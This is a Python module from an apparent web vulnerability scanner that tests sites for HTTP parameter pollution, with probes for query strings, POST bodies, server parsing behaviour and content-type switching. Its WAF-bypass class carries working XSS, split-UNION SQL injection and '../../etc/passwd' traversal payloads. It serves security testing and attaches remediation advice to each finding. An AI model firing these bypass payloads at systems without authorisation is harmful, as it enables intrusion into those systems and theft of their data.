"""
websecure.scanners.param_pollution
------------------------------------
HTTP Parameter Pollution (HPP) full scanner.

Classes:
  QueryStringHPPProber       — Duplicate params in URL query string
  PostBodyHPPProber          — Duplicate params in POST body (URL-enc, JSON, multipart, GET+POST)
  ServerParseProfiler        — Detect server-side param parsing behavior
  HPPWAFBypassProber         — Use HPP to bypass WAF rules (split payload technique)
  ContentTypeSwitchingProber — Same param via form vs JSON to detect parsing differences
  ParamPollutionScanner      — Orchestrator
"""
from __future__ import annotations

import json
import logging
import re
import uuid
from typing import Dict, List, Optional, Tuple
from urllib.parse import (
    parse_qsl,
    urlencode,
    urlparse,
    urlunparse,
)

# For multipart body construction

from websecure.scanners.base import BaseScanner

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_CANARY_PREFIX = "wsp_hpp_"

# Known WAF fingerprint patterns in response headers / body
_WAF_HEADER_RE = re.compile(
    r"(cloudflare|akamai|sucuri|incapsula|imperva|mod_security|f5|barracuda|"
    r"fortiweb|aws.waf|azurewaf|x-sucuri|x-firewall)",
    re.IGNORECASE,
)

# Sentinel value to detect which copy wins
_FIRST_VAL = "wsp_FIRST"
_LAST_VAL = "wsp_LAST"
_MERGED_RE = re.compile(r"wsp_FIRST[,\s+]+wsp_LAST|wsp_LAST[,\s+]+wsp_FIRST", re.IGNORECASE)

# Payload categories for WAF bypass
_XSS_PAYLOAD = "<script>alert(1)</script>"

# Field patterns that indicate sensitive parameters
_SENSITIVE_PARAM_RE = re.compile(
    r"(id|user|uid|account|token|key|auth|pass|pwd|secret|email|name|"
    r"query|q|search|page|file|path|redirect|url|next|return|amount|price)",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# Helper utilities
# ---------------------------------------------------------------------------


def _canary() -> str:
    """Generate a unique canary string for this probe."""
    return _CANARY_PREFIX + uuid.uuid4().hex[:10]


def _extract_params(url: str) -> List[Tuple[str, str]]:
    """Return list of (name, value) pairs from URL query string."""
    parsed = urlparse(url)
    return parse_qsl(parsed.query, keep_blank_values=True)


def _has_canary(body: str, canary: str) -> bool:
    return canary.lower() in body.lower()


def _detect_waf(resp) -> bool:
    """Return True if response signatures suggest a WAF is present."""
    for header_name, header_val in resp.headers.items():
        if _WAF_HEADER_RE.search(header_name) or _WAF_HEADER_RE.search(header_val):
            return True
    if resp.status_code in (403, 406, 429, 501):
        server = resp.headers.get("Server", "")
        if _WAF_HEADER_RE.search(server):
            return True
    return False


def _safe_text(resp) -> str:
    try:
        return resp.text
    except Exception:
        return ""


# ===========================================================================
# 1. QueryStringHPPProber
# ===========================================================================

class QueryStringHPPProber(BaseScanner):
    """
    Probe URL query string parameters for HTTP Parameter Pollution.

    Techniques tested:
      - Duplicate param: ?p=safe&p=<canary>   (which copy does server use?)
      - Array bracket:   ?p[]=safe&p[]=<canary>
      - Indexed array:   ?p[0]=safe&p[1]=<canary>
      - Semicolon sep:   ?p=safe;injected=<canary>
      - Comma sep:       ?p=safe,<canary>
      - Encoded amp:     ?p=safe%26injected=<canary>

    Reports which parsing behaviour the server exhibits plus any canary
    reflection that proves the injected value reaches the application.
    """

    name = "hpp_query"

    def run(self, target: str, **kwargs) -> List[Dict]:
        """Probe all discovered query parameters for HPP."""
        findings: List[Dict] = []
        params = _extract_params(target)

        if not params:
            # Try with a synthetic probe parameter
            params = [("id", "1"), ("q", "test")]
            logger.debug("[QueryHPP] No params found in URL; using synthetic params.")

        for name, orig_value in params:
            if not _SENSITIVE_PARAM_RE.search(name) and len(params) > 4:
                # For large param sets, focus on sensitive names
                continue

            canary = _canary()
            for technique, polluted_url in self._build_variants(
                target, name, orig_value, canary
            ):
                try:
                    resp = self.session.get(
                        polluted_url,
                        timeout=7,
                        verify=False,
                        allow_redirects=True,
                    )
                except Exception as exc:
                    logger.debug(
                        "[QueryHPP] %s technique=%s error: %r",
                        name,
                        technique,
                        exc,
                    )
                    continue

                body = _safe_text(resp)
                if _has_canary(body, canary):
                    finding = {
                        "vuln_type": f"HTTP Parameter Pollution — Query String ({technique})",
                        "url": target,
                        "param": name,
                        "payload": polluted_url,
                        "severity": "High",
                        "description": (
                            f"Canary value reflected in response via HPP technique '{technique}' "
                            f"on parameter '{name}'. The server accepted the polluted parameter "
                            "value, indicating server-side parameter pollution is possible."
                        ),
                        "evidence": {
                            "technique": technique,
                            "param": name,
                            "canary": canary,
                            "polluted_url": polluted_url,
                            "status_code": resp.status_code,
                            "body_snippet": body[:300],
                        },
                        "remediation": (
                            "Validate and reject duplicate query parameters server-side. "
                            "Use a strict parameter parsing library."
                        ),
                    }
                    findings.append(finding)
                    self.report_finding(**finding)
                    break  # One confirmed HPP per parameter is enough

        return findings

    def _build_variants(
        self,
        url: str,
        name: str,
        orig_value: str,
        canary: str,
    ) -> List[Tuple[str, str]]:
        """Build URL variants for each HPP technique."""
        parsed = urlparse(url)
        base_params = [
            (k, v)
            for k, v in parse_qsl(parsed.query, keep_blank_values=True)
            if k != name
        ]

        safe_pair = (name, orig_value)

        def _url_with(extra_params: List[Tuple[str, str]]) -> str:
            q = urlencode(base_params + [safe_pair] + extra_params)
            return urlunparse(parsed._replace(query=q))

        def _url_replace(new_params: List[Tuple[str, str]]) -> str:
            q = urlencode(base_params + new_params)
            return urlunparse(parsed._replace(query=q))

        variants: List[Tuple[str, str]] = [
            # Classic duplicate — last value wins on some backends
            ("duplicate_last", _url_with([(name, canary)])),
            # Classic duplicate — first value wins variant (canary first)
            (
                "duplicate_first",
                urlunparse(
                    parsed._replace(
                        query=urlencode(
                            base_params + [(name, canary), (name, orig_value)]
                        )
                    )
                ),
            ),
            # Array bracket notation
            (
                "array_bracket",
                urlunparse(
                    parsed._replace(
                        query=urlencode(
                            base_params
                            + [(f"{name}[]", orig_value), (f"{name}[]", canary)]
                        )
                    )
                ),
            ),
            # Indexed array
            (
                "indexed_array",
                urlunparse(
                    parsed._replace(
                        query=urlencode(
                            base_params
                            + [(f"{name}[0]", orig_value), (f"{name}[1]", canary)]
                        )
                    )
                ),
            ),
            # Semicolon separation (classic HPP on some Java/PHP servers)
            (
                "semicolon_sep",
                urlunparse(
                    parsed._replace(
                        query=urlencode(
                            base_params
                            + [(name, f"{orig_value};injected={canary}")]
                        )
                    )
                ),
            ),
            # Comma separation
            (
                "comma_sep",
                urlunparse(
                    parsed._replace(
                        query=urlencode(
                            base_params + [(name, f"{orig_value},{canary}")]
                        )
                    )
                ),
            ),
            # Encoded ampersand (server-side only — WAF bypass)
            (
                "encoded_amp",
                urlunparse(
                    parsed._replace(
                        query=urlencode(
                            base_params
                            + [(name, f"{orig_value}%26injected={canary}")]
                        )
                    )
                ),
            ),
        ]
        return variants


# ===========================================================================
# 2. PostBodyHPPProber
# ===========================================================================

class PostBodyHPPProber(BaseScanner):
    """
    Probe POST body parameters for HTTP Parameter Pollution.

    Techniques tested:
      - Duplicate form fields (application/x-www-form-urlencoded)
      - Duplicate JSON keys {"param":"safe","param":"evil"}
      - Multipart/form-data duplicate fields
      - Cross-contamination: POST body param polluting URL query string
      - Cross-contamination: URL query param polluting POST body
    """

    name = "hpp_post"

    def run(self, target: str, **kwargs) -> List[Dict]:
        """Run POST HPP probes against the target."""
        findings: List[Dict] = []

        # Gather candidate params from URL query + kwargs hints
        url_params = _extract_params(target)
        post_params = list(kwargs.get("post_params", url_params or [("id", "1")]))

        for name, orig_value in post_params:
            canary = _canary()

            # 1. Duplicate URL-encoded form fields: param=val1&param=val2&param=val3
            f = self._probe_urlencoded(target, name, orig_value, canary)
            if f:
                findings.append(f)
                self.report_finding(**f)

            canary2 = _canary()
            # 2. JSON body with duplicate keys
            f2 = self._probe_json(target, name, orig_value, canary2)
            if f2:
                findings.append(f2)
                self.report_finding(**f2)

            canary3 = _canary()
            # 3. Multipart/form-data with duplicate fields
            f3 = self._probe_multipart(target, name, orig_value, canary3)
            if f3:
                findings.append(f3)
                self.report_finding(**f3)

            canary4 = _canary()
            # 4. GET+POST same param: GET ?param=A, POST body param=B
            f4 = self._probe_get_post_same_param(target, name, orig_value, canary4)
            if f4:
                findings.append(f4)
                self.report_finding(**f4)

            canary5 = _canary()
            # 5. Cross-contamination: inject POST param into URL query context
            f5 = self._probe_cross_contamination(target, name, orig_value, canary5)
            if f5:
                findings.append(f5)
                self.report_finding(**f5)

        return findings

    def _probe_urlencoded(
        self,
        url: str,
        name: str,
        orig_value: str,
        canary: str,
    ) -> Optional[Dict]:
        """POST with duplicate URL-encoded params and check canary."""
        # Build raw body manually to bypass requests de-duplication
        raw_body = urlencode([(name, orig_value), (name, canary)])
        try:
            resp = self.session.post(
                url,
                data=raw_body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=7,
                verify=False,
                allow_redirects=True,
            )
        except Exception as exc:
            logger.debug("[PostHPP/urlenc] %s error: %r", name, exc)
            return None

        body = _safe_text(resp)
        if _has_canary(body, canary):
            return {
                "vuln_type": "HTTP Parameter Pollution — POST Body (URL-Encoded Duplicate)",
                "url": url,
                "param": name,
                "payload": raw_body,
                "severity": "High",
                "description": (
                    f"Duplicate POST parameter '{name}' — canary value reflected in response. "
                    "Server processed the injected duplicate parameter value."
                ),
                "evidence": {
                    "technique": "post_urlencoded_duplicate",
                    "param": name,
                    "canary": canary,
                    "status_code": resp.status_code,
                    "body_snippet": body[:300],
                },
                "remediation": (
                    "Reject requests containing duplicate parameter names. "
                    "Use a framework that raises an error on duplicate parameters."
                ),
            }
        return None

    def _probe_json(
        self,
        url: str,
        name: str,
        orig_value: str,
        canary: str,
    ) -> Optional[Dict]:
        """POST a JSON body with duplicate keys (raw string to bypass json.dumps dedup)."""
        # RFC 7159 does not forbid duplicate keys; behavior is implementation-defined.
        raw_json = f'{{"{name}": "{orig_value}", "{name}": "{canary}"}}'
        try:
            resp = self.session.post(
                url,
                data=raw_json.encode(),
                headers={"Content-Type": "application/json"},
                timeout=7,
                verify=False,
                allow_redirects=True,
            )
        except Exception as exc:
            logger.debug("[PostHPP/json] %s error: %r", name, exc)
            return None

        body = _safe_text(resp)
        if _has_canary(body, canary):
            return {
                "vuln_type": "HTTP Parameter Pollution — JSON Body (Duplicate Key)",
                "url": url,
                "param": name,
                "payload": raw_json,
                "severity": "High",
                "description": (
                    f"JSON body with duplicate key '{name}' — canary reflected. "
                    "The JSON parser accepted the second (attacker-controlled) value."
                ),
                "evidence": {
                    "technique": "post_json_duplicate_key",
                    "param": name,
                    "canary": canary,
                    "status_code": resp.status_code,
                    "body_snippet": body[:300],
                },
                "remediation": (
                    "Use a strict JSON parser that rejects duplicate keys "
                    "(e.g., Python json with object_pairs_hook)."
                ),
            }
        return None

    def _probe_multipart(
        self,
        url: str,
        name: str,
        orig_value: str,
        canary: str,
    ) -> Optional[Dict]:
        """POST multipart/form-data with the same field name twice."""
        boundary = "wsp_boundary_" + uuid.uuid4().hex[:8]
        # Build raw multipart body with duplicate field
        body_parts = [
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
            f"{orig_value}\r\n",
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
            f"{canary}\r\n",
            f"--{boundary}--\r\n",
        ]
        raw_body = "".join(body_parts).encode("utf-8")
        content_type = f"multipart/form-data; boundary={boundary}"
        try:
            resp = self.session.post(
                url,
                data=raw_body,
                headers={"Content-Type": content_type},
                timeout=7,
                verify=False,
                allow_redirects=True,
            )
        except Exception as exc:
            logger.debug("[PostHPP/multipart] %s error: %r", name, exc)
            return None

        body = _safe_text(resp)
        if _has_canary(body, canary):
            return {
                "vuln_type": "HTTP Parameter Pollution — Multipart Body (Duplicate Field)",
                "url": url,
                "param": name,
                "payload": f"multipart duplicate field: {name}={orig_value} + {name}={canary}",
                "severity": "High",
                "description": (
                    f"Multipart/form-data request with duplicate field '{name}' — canary reflected. "
                    "The server accepted the second (injected) field value."
                ),
                "evidence": {
                    "technique": "post_multipart_duplicate",
                    "param": name,
                    "canary": canary,
                    "status_code": resp.status_code,
                    "body_snippet": body[:300],
                },
                "remediation": (
                    "Reject multipart requests containing duplicate field names. "
                    "Validate each field name appears at most once."
                ),
            }
        return None

    def _probe_get_post_same_param(
        self,
        url: str,
        name: str,
        get_value: str,
        post_canary: str,
    ) -> Optional[Dict]:
        """
        Send GET ?param=A while POST body has param=B (canary).
        Frameworks that merge GET+POST params may use the POST value,
        or the GET value may override the POST value.
        """
        parsed = urlparse(url)
        existing = parse_qsl(parsed.query, keep_blank_values=True)
        # Ensure the param is in the query string
        existing_dict = dict(existing)
        if name not in existing_dict:
            new_query = urlencode(list(existing) + [(name, get_value)])
        else:
            new_query = urlencode(
                [(k, v if k != name else get_value) for k, v in existing]
            )
        test_url = urlunparse(parsed._replace(query=new_query))

        post_body = urlencode([(name, post_canary)])
        try:
            resp = self.session.post(
                test_url,
                data=post_body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=7,
                verify=False,
                allow_redirects=True,
            )
        except Exception as exc:
            logger.debug("[PostHPP/get_post] %s error: %r", name, exc)
            return None

        resp_body = _safe_text(resp)
        if _has_canary(resp_body, post_canary):
            return {
                "vuln_type": "HTTP Parameter Pollution — GET+POST Same Parameter (POST Wins)",
                "url": url,
                "param": name,
                "payload": f"GET: ?{name}={get_value} + POST body: {name}={post_canary}",
                "severity": "High",
                "description": (
                    f"Parameter '{name}' sent in both URL query string (GET={get_value!r}) "
                    f"and POST body (POST={post_canary!r}). "
                    "Server reflected the POST body value, indicating GET+POST parameter merging. "
                    "Attackers can override URL-level parameters via POST body injection."
                ),
                "evidence": {
                    "technique": "get_post_same_param_post_wins",
                    "param": name,
                    "get_value": get_value,
                    "canary": post_canary,
                    "status_code": resp.status_code,
                    "body_snippet": resp_body[:300],
                },
                "remediation": (
                    "Process GET and POST parameters from separate namespaces. "
                    "Never silently merge them; prefer explicit source selection."
                ),
            }
        return None

    def _probe_cross_contamination(
        self,
        url: str,
        name: str,
        orig_value: str,
        canary: str,
    ) -> Optional[Dict]:
        """
        POST with canary in body while the same name exists in URL query string.
        Some frameworks merge query + body params; canary in response confirms pollution.
        """
        # Build URL with original param
        parsed = urlparse(url)
        existing = parse_qsl(parsed.query, keep_blank_values=True)
        existing_dict = dict(existing)
        if name not in existing_dict:
            # Inject it into the query string for this test
            new_query = urlencode(list(existing) + [(name, orig_value)])
            test_url = urlunparse(parsed._replace(query=new_query))
        else:
            test_url = url

        body = urlencode([(name, canary)])
        try:
            resp = self.session.post(
                test_url,
                data=body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=7,
                verify=False,
                allow_redirects=True,
            )
        except Exception as exc:
            logger.debug("[PostHPP/cross] %s error: %r", name, exc)
            return None

        resp_body = _safe_text(resp)
        if _has_canary(resp_body, canary):
            return {
                "vuln_type": "HTTP Parameter Pollution — POST/GET Cross-Contamination",
                "url": url,
                "param": name,
                "payload": f"URL: {name}={orig_value}; POST: {name}={canary}",
                "severity": "High",
                "description": (
                    f"Parameter '{name}' exists in both URL query string and POST body. "
                    "Server reflected the POST body value, indicating GET+POST parameter merging. "
                    "Attackers can override URL params via POST body injection."
                ),
                "evidence": {
                    "technique": "post_get_cross_contamination",
                    "param": name,
                    "canary": canary,
                    "status_code": resp.status_code,
                    "body_snippet": resp_body[:300],
                },
                "remediation": (
                    "Do not merge query string and body parameters automatically. "
                    "Process them from separate namespaces."
                ),
            }
        return None


# ===========================================================================
# 3. ServerParseProfiler
# ===========================================================================

class ServerParseProfiler(BaseScanner):
    """
    Detect server-side HTTP parameter parsing behavior by sending
    controlled duplicate parameter values and observing which value is used.

    Profiles:
      first_wins   — Node.js, Go, Django (use first value)
      last_wins    — PHP, Perl (use last value)
      merged       — ASP.NET, JSP (concatenate with comma/space)
      error        — Strict security-conscious frameworks (reject duplicates)
      array        — PHP ?a[]=1&a[]=2 handling
    """

    name = "hpp_profile"

    def run(self, target: str, **kwargs) -> List[Dict]:
        """Profile the server's parameter parsing strategy."""
        findings: List[Dict] = []

        parsed = urlparse(target)
        base_params = parse_qsl(parsed.query, keep_blank_values=True)

        # Use a neutral parameter name unlikely to cause side-effects
        test_name = "a"
        dup_url = urlunparse(
            parsed._replace(
                query=urlencode(
                    base_params
                    + [(test_name, _FIRST_VAL), (test_name, _LAST_VAL)]
                )
            )
        )

        try:
            resp = self.session.get(
                dup_url, timeout=7, verify=False, allow_redirects=True
            )
        except Exception as exc:
            logger.debug("[ServerProfile] Duplicate param probe failed: %r", exc)
            return findings

        body = _safe_text(resp)
        behavior = self._classify_behavior(body, resp.status_code)

        # Array handling probe
        array_url = urlunparse(
            parsed._replace(
                query=urlencode(
                    base_params
                    + [(f"{test_name}[]", _FIRST_VAL), (f"{test_name}[]", _LAST_VAL)]
                )
            )
        )
        array_behavior: Optional[str] = None
        try:
            arr_resp = self.session.get(
                array_url, timeout=7, verify=False, allow_redirects=True
            )
            arr_body = _safe_text(arr_resp)
            if _FIRST_VAL.lower() in arr_body.lower() and _LAST_VAL.lower() in arr_body.lower():
                array_behavior = "array_reflected_both"
            elif _FIRST_VAL.lower() in arr_body.lower():
                array_behavior = "array_first_only"
            elif _LAST_VAL.lower() in arr_body.lower():
                array_behavior = "array_last_only"
        except Exception as exc:
            logger.debug("[ServerProfile] Array probe failed: %r", exc)

        exploitable = behavior in ("first_wins", "last_wins", "merged")
        severity = "Medium" if exploitable else "Informational"

        finding = {
            "vuln_type": f"Server Parameter Parse Behavior: {behavior}",
            "url": target,
            "param": test_name,
            "payload": dup_url,
            "severity": severity,
            "description": (
                f"Server exhibits '{behavior}' parameter parsing behavior when receiving "
                f"duplicate query parameters. "
                + self._behavior_description(behavior)
                + (f" Array handling: {array_behavior}." if array_behavior else "")
            ),
            "evidence": {
                "behavior": behavior,
                "array_behavior": array_behavior,
                "probe_url": dup_url,
                "status_code": resp.status_code,
                "body_snippet": body[:200],
            },
            "remediation": self._behavior_remediation(behavior),
        }
        findings.append(finding)
        self.report_finding(**finding)

        return findings

    def _classify_behavior(self, body: str, status_code: int) -> str:
        """Classify server behavior from response body."""
        if status_code in (400, 422, 500):
            return "error"
        body_lower = body.lower()
        first_in_body = _FIRST_VAL.lower() in body_lower
        last_in_body = _LAST_VAL.lower() in body_lower

        if first_in_body and last_in_body:
            # Check for merged pattern e.g. "wsp_FIRST,wsp_LAST"
            if _MERGED_RE.search(body):
                return "merged"
            return "both_reflected"

        if first_in_body:
            return "first_wins"
        if last_in_body:
            return "last_wins"
        return "unknown"

    def _behavior_description(self, behavior: str) -> str:
        descriptions = {
            "first_wins": (
                "The server uses the first occurrence of a duplicate parameter. "
                "Common in Node.js/Express, Go, Django."
            ),
            "last_wins": (
                "The server uses the last occurrence of a duplicate parameter. "
                "Common in PHP and Perl."
            ),
            "merged": (
                "The server merges duplicate parameter values (e.g., 'val1,val2'). "
                "Common in ASP.NET and JSP environments."
            ),
            "error": "The server rejects duplicate parameters with an error response.",
            "both_reflected": (
                "Both parameter values appear in the response independently."
            ),
            "unknown": "Behavior could not be determined from the response.",
        }
        return descriptions.get(behavior, "")

    def _behavior_remediation(self, behavior: str) -> str:
        if behavior == "error":
            return "Server correctly rejects duplicate parameters — no action needed."
        return (
            "Explicitly validate that no parameter appears more than once in requests. "
            "Return a 400 error for duplicate parameter names to prevent HPP exploitation."
        )


# ===========================================================================
# 4. HPPWAFBypassProber
# ===========================================================================

class HPPWAFBypassProber(BaseScanner):
    """
    Attempt to bypass WAF inspection using HTTP Parameter Pollution.

    Strategy: If the WAF only inspects the first (or last) copy of a parameter,
    an attacker can place a safe value where the WAF looks and a malicious value
    where the backend parses.

    Attack vectors:
      - XSS:  ?q=safe&q=<script>alert(1)</script>
      - SQLi: ?id=1&id=1 OR 1=1
      - Path: ?file=safe.txt&file=../../etc/passwd

    A finding is only reported if the malicious canary reaches the application
    (i.e., appears in the response), confirming bypass.
    """

    name = "hpp_waf_bypass"

    def run(self, target: str, **kwargs) -> List[Dict]:
        """Probe for WAF bypass via HPP."""
        findings: List[Dict] = []
        params = _extract_params(target)

        if not params:
            params = [("q", "test"), ("id", "1"), ("file", "index.html")]

        # First check for WAF presence
        try:
            baseline = self.session.get(
                target, timeout=7, verify=False, allow_redirects=True
            )
            waf_present = _detect_waf(baseline)
        except Exception as exc:
            logger.debug("[HPPWAFBypass] Baseline fetch failed: %r", exc)
            return findings

        if not waf_present:
            logger.debug(
                "[HPPWAFBypass] No WAF fingerprinted for %s; "
                "running bypass probes anyway (WAF may be transparent).",
                target,
            )

        parsed = urlparse(target)
        base_params = [
            (k, v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)
        ]

        for name, safe_value in params:
            # --- XSS bypass (full payload) ---
            xss_canary = _canary()
            xss_payload = _XSS_PAYLOAD.replace("1", xss_canary)
            f = self._probe_bypass(
                parsed,
                base_params,
                name,
                safe_value,
                xss_payload,
                "XSS",
                waf_present,
            )
            if f:
                findings.append(f)
                self.report_finding(**f)

            # --- XSS split payload bypass ---
            # Split <script>alert(1)</script> across two HPP params so WAF sees each half as benign
            xss_split_canary = _canary()
            f = self._probe_split_payload(
                parsed,
                base_params,
                name,
                part1=f"<script&{name}=>alert({xss_split_canary})</script>",
                part2_label="xss_split",
                attack_type="XSS-Split",
                expected_canary=xss_split_canary,
                waf_present=waf_present,
            )
            if f:
                findings.append(f)
                self.report_finding(**f)

            # --- SQLi bypass ---
            sqli_canary = _canary()
            sqli_payload = f"1 OR {sqli_canary}=1"
            f = self._probe_bypass(
                parsed,
                base_params,
                name,
                safe_value,
                sqli_payload,
                "SQLi",
                waf_present,
            )
            if f:
                findings.append(f)
                self.report_finding(**f)

            # --- SQLi split payload bypass ---
            # id=1 UN&id=ION SE&id=LECT 1,2,3 → backend joins as "1 UNION SELECT 1,2,3"
            sqli_split_canary = _canary()
            f = self._probe_split_sqli(
                parsed,
                base_params,
                name,
                sqli_split_canary,
                waf_present,
            )
            if f:
                findings.append(f)
                self.report_finding(**f)

            # --- Path traversal bypass ---
            pt_canary = _canary()
            pt_payload = f"../../etc/passwd#{pt_canary}"
            f = self._probe_bypass(
                parsed,
                base_params,
                name,
                safe_value,
                pt_payload,
                "PathTraversal",
                waf_present,
            )
            if f:
                findings.append(f)
                self.report_finding(**f)

        return findings

    def _probe_split_payload(
        self,
        parsed,
        base_params: List[Tuple[str, str]],
        name: str,
        part1: str,
        part2_label: str,
        attack_type: str,
        expected_canary: str,
        waf_present: bool,
    ) -> Optional[Dict]:
        """
        XSS split-payload HPP: send the XSS in two halves split across repeated params.
        e.g. q=<script&q=>alert(1)</script>
        When the backend concatenates them, the XSS fires; WAF only sees split tokens.
        """
        target_url = urlunparse(parsed)
        # Build query string manually — requests urlencode would not produce the raw split
        raw_qs = urlencode(base_params + [(name, part1)])
        probe_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{raw_qs}"
        try:
            resp = self.session.get(probe_url, timeout=7, verify=False, allow_redirects=True)
        except Exception as exc:
            logger.debug("[HPPWAFBypass] split %s error: %r", attack_type, exc)
            return None

        body = _safe_text(resp)
        if expected_canary.lower() in body.lower() or "<script>" in body.lower():
            waf_note = "WAF fingerprinted — bypass confirmed." if waf_present else "No WAF detected."
            return {
                "vuln_type": f"WAF Bypass via HPP Split Payload ({attack_type})",
                "url": target_url,
                "param": name,
                "payload": probe_url,
                "severity": "Critical" if waf_present else "High",
                "description": (
                    f"Split-payload HPP bypass: XSS payload split across repeated '{name}' params. "
                    f"Backend concatenation may reassemble the payload, bypassing WAF token inspection. "
                    f"{waf_note}"
                ),
                "evidence": {
                    "attack_type": attack_type,
                    "param": name,
                    "part1": part1,
                    "probe_url": probe_url,
                    "waf_present": waf_present,
                    "status_code": resp.status_code,
                    "body_snippet": body[:300],
                },
                "remediation": (
                    "Configure WAF to inspect ALL repeated parameter occurrences. "
                    "Never concatenate repeated params without sanitization."
                ),
            }
        return None

    def _probe_split_sqli(
        self,
        parsed,
        base_params: List[Tuple[str, str]],
        name: str,
        canary: str,
        waf_present: bool,
    ) -> Optional[Dict]:
        """
        SQLi split-payload: id=1 UN&id=ION SE&id=LECT 1,2,3
        If backend joins param values, the result is '1 UNION SELECT 1,2,3'.
        """
        target_url = urlunparse(parsed)
        # Build three-way split: WAF sees each fragment as safe
        split_params = base_params + [
            (name, "1 UN"),
            (name, "ION SE"),
            (name, f"LECT 1,2,{canary}"),
        ]
        probe_url = urlunparse(parsed._replace(query=urlencode(split_params)))
        try:
            resp = self.session.get(probe_url, timeout=7, verify=False, allow_redirects=True)
        except Exception as exc:
            logger.debug("[HPPWAFBypass] sqli_split error: %r", exc)
            return None

        body = _safe_text(resp)
        # Check for canary or SQL error indicators
        # NOTE: "union" alone is too broad (FP on any page mentioning unions).
        # "sql" alone is too broad (FP on SQL documentation/framework pages).
        # Use specific SQL error messages or canary reflection only.
        reflected = (
            canary.lower() in body.lower()
            or "syntax error" in body.lower()
            or "you have an error in your sql" in body.lower()
        )
        if reflected:
            waf_note = "WAF fingerprinted — bypass confirmed." if waf_present else "No WAF detected."
            return {
                "vuln_type": "WAF Bypass via HPP Split SQLi Payload",
                "url": target_url,
                "param": name,
                "payload": probe_url,
                "severity": "Critical" if waf_present else "High",
                "description": (
                    f"SQLi payload split across three repeated '{name}' params "
                    f"(1 UN / ION SE / LECT 1,2,...). "
                    "If backend concatenates all values, the UNION SELECT is reassembled. "
                    f"{waf_note}"
                ),
                "evidence": {
                    "attack_type": "SQLi-Split",
                    "param": name,
                    "canary": canary,
                    "probe_url": probe_url,
                    "waf_present": waf_present,
                    "status_code": resp.status_code,
                    "body_snippet": body[:300],
                },
                "remediation": (
                    "Validate and reject duplicate parameters. "
                    "Use parameterized queries and WAF rules that inspect all param copies."
                ),
            }
        return None

    def _probe_bypass(
        self,
        parsed,
        base_params: List[Tuple[str, str]],
        name: str,
        safe_value: str,
        evil_payload: str,
        attack_type: str,
        waf_present: bool,
    ) -> Optional[Dict]:
        """
        Send safe_value first (WAF sees it), evil_payload second (backend may use it).
        Also try evil_payload first for 'last_wins' backends.
        """
        target_url = urlunparse(parsed)

        for order, params_list in [
            (
                "safe_first",
                base_params
                + [(name, safe_value), (name, evil_payload)],
            ),
            (
                "evil_first",
                base_params
                + [(name, evil_payload), (name, safe_value)],
            ),
        ]:
            probe_url = urlunparse(
                parsed._replace(query=urlencode(params_list))
            )
            try:
                resp = self.session.get(
                    probe_url,
                    timeout=7,
                    verify=False,
                    allow_redirects=True,
                )
            except Exception as exc:
                logger.debug(
                    "[HPPWAFBypass] %s %s error: %r", attack_type, order, exc
                )
                continue

            # WAF blocked this request — try the other order
            if resp.status_code in (403, 406, 429) and order == "safe_first":
                continue

            body = _safe_text(resp)

            # For XSS: look for the payload fragment in response
            # For SQLi/Path: look for error messages or canary
            reflected = False
            if attack_type == "XSS":
                reflected = evil_payload.lower() in body.lower()
            elif attack_type == "SQLi":
                # "sql" alone is too broad (FP on SQL docs/framework pages); use specific errors.
                reflected = (
                    "syntax error" in body.lower()
                    or "you have an error in your sql" in body.lower()
                    or "sql syntax" in body.lower()
                    or "ora-0" in body.lower()
                    or evil_payload.lower() in body.lower()
                )
            elif attack_type == "PathTraversal":
                reflected = (
                    "root:" in body
                    or "/bin/bash" in body
                    or evil_payload.lower() in body.lower()
                )

            if reflected:
                waf_note = (
                    "WAF fingerprinted — bypass confirmed." if waf_present
                    else "No WAF detected — application directly vulnerable."
                )
                return {
                    "vuln_type": f"WAF Bypass via HPP ({attack_type})",
                    "url": target_url,
                    "param": name,
                    "payload": probe_url,
                    "severity": "Critical" if waf_present else "High",
                    "description": (
                        f"Parameter '{name}' with HPP order '{order}' caused {attack_type} "
                        f"payload to reach the application, bypassing WAF inspection. {waf_note}"
                    ),
                    "evidence": {
                        "attack_type": attack_type,
                        "order": order,
                        "param": name,
                        "payload": evil_payload,
                        "probe_url": probe_url,
                        "waf_present": waf_present,
                        "status_code": resp.status_code,
                        "body_snippet": body[:300],
                    },
                    "remediation": (
                        "Configure WAF to inspect ALL occurrences of repeated parameters, "
                        "not just the first or last. Implement server-side input validation "
                        "independent of WAF."
                    ),
                }
        return None


# ===========================================================================
# 5. ContentTypeSwitchingProber
# ===========================================================================

class ContentTypeSwitchingProber(BaseScanner):
    """
    Detect parameter parsing differences when the same param is sent as
    application/x-www-form-urlencoded vs. application/json.

    Some backends route form vs JSON requests through different code paths,
    resulting in different validation, different values being used, or different
    access control decisions. If the canary is reflected in one content type
    but not the other, it indicates a content-type-based parsing discrepancy.
    """

    name = "hpp_content_switch"

    def run(self, target: str, **kwargs) -> List[Dict]:
        """Probe for content-type switching parameter parsing differences."""
        findings: List[Dict] = []

        url_params = _extract_params(target)
        post_params = list(kwargs.get("post_params", url_params or [("id", "1"), ("q", "test")]))

        for name, orig_value in post_params:
            canary = _canary()
            form_result = self._send_form(target, name, canary)
            json_result = self._send_json(target, name, canary)

            form_reflected = form_result is not None and _has_canary(_safe_text(form_result), canary)
            json_reflected = json_result is not None and _has_canary(_safe_text(json_result), canary)

            if form_reflected != json_reflected:
                # Discrepancy: one format reflects canary, the other doesn't
                winning_type = "form (application/x-www-form-urlencoded)" if form_reflected else "JSON (application/json)"
                losing_type = "JSON (application/json)" if form_reflected else "form (application/x-www-form-urlencoded)"
                finding = {
                    "vuln_type": "Content-Type Switching — Parameter Parsing Discrepancy",
                    "url": target,
                    "param": name,
                    "payload": f"{name}={canary} via {winning_type}",
                    "severity": "High",
                    "description": (
                        f"Parameter '{name}' is reflected when sent as {winning_type} "
                        f"but not as {losing_type}. "
                        "This indicates different code paths handle each content type differently, "
                        "which may allow bypassing validation or access control by switching format."
                    ),
                    "evidence": {
                        "technique": "content_type_switching",
                        "param": name,
                        "canary": canary,
